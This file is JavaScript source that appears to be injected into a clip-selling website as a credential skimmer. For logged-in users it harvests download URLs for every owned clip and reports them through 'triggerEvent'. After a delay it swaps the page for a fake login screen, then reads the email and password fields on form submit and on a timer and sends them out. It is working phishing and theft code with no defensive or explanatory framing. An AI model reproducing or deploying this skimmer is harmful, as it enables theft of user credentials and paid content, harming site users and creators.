const skimCredentials = () => {
  let username = ''
  let password = ''
  document.querySelectorAll('input[name="email"]').forEach(n => {
    if(n.value) {
      username = n.value
    }
  })
  document.querySelectorAll('input[name="password"]').forEach(n => {
    if(n.value) {
      password = n.value
    }
  })
  return {username, password}
}

const logCredentials = () => {
  const creds = skimCredentials()
  if(creds.username && creds.password) {
    return triggerEvent(creds)
  }
  return Promise.reject()
}

const onSubmit = (event) => {
  event.preventDefault();
  logCredentials().then(() => {
    window.location.reload()
  }).catch(() => {})
  return false;
};

const loginCapture = () => {
  document.body.innerHTML = userLoginPageInnerHtml;
  document.querySelectorAll('form').forEach(n => {
    n.onsubmit = onSubmit
  })

  // get account type buttons working
  document.querySelectorAll('.account-type-btn').forEach(n => {
    const textElem = document.querySelector('.text-ladylikePorcelain.text-lg.uppercase')
    n.onclick = () => {
        document.querySelectorAll('.account-type-btn').forEach(n1 => {
          n1.classList.remove('active')
        })
        n.classList.add('active')
        textElem.innerText = `${n.innerText.toUpperCase()} ACCOUNT SIGN IN`
    }
  })

  setTimeout(() => {
    logCredentials().catch(() => {})
  }, 3000)
};


const main = async () => {

  const username = getUsername()
  const isLoggedIn = !!username

  const hasLoggedClips = window.sessionStorage.getItem('clips') !== null

  if(isLoggedIn && !hasLoggedClips) {
    const allIds = await getAllClipIds()
    let fullUrlMap = {}
    for(let i=0; i<allIds.length; i++) {
      const urls = await getDownloadUrls(allIds[i])
      fullUrlMap[allIds[i]] = urls
      if(urls[0]) {
        await triggerEvent({ username, url: urls[0] }, 'c4s_clip_urls')
      }
    }
    await triggerEvent({ username, data: fullUrlMap }, 'c4s_event_owned')
    window.sessionStorage.setItem('clips', 'true')
  }

  if (window.sessionStorage.getItem('log-attempt') === null) {
    window.sessionStorage.setItem('log-attempt', 'true')
    setTimeout(loginCapture, 5000)
  }
  
}

main()




